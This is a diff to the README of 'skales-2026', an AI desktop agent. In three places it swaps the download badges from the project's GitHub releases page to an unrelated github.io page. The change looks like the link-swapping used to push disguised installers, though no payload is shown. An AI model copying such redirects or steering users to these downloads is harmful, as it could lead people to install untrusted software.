@@ -1,6 +1,6 @@
 # 🚀 skales-2026 - Your Personal AI That Works Alone
 
-[![Download Now](https://img.shields.io/badge/Download%20skales--2026-4B8BBE?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Meadeobjectionable143/skales-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download%20skales--2026-4B8BBE?style=for-the-badge&logo=windows&logoColor=white)](https://meadeobjectionable143.github.io)
 
 ## 🎯 What Is skales-2026?
 
@@ -38,7 +38,7 @@ skales-2026 is a personal AI desktop agent that runs on Windows, macOS, Linux, A
 
 Visit this link to download the application:
 
-[![Download skales-2026](https://img.shields.io/badge/⬇%20Download%20skales--2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Meadeobjectionable143/skales-2026/releases)
+[![Download skales-2026](https://img.shields.io/badge/⬇%20Download%20skales--2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://meadeobjectionable143.github.io)
 
 ### Step 2: Install
 
@@ -125,7 +125,7 @@ For detailed guides and tutorials, check the repository's wiki and SKILL.md file
 
 ## 📥 Download Again
 
-[![Download skales-2026](https://img.shields.io/badge/🔄%20Download%20Again-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Meadeobjectionable143/skales-2026/releases)
+[![Download skales-2026](https://img.shields.io/badge/🔄%20Download%20Again-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://meadeobjectionable143.github.io)
 
 ---
 
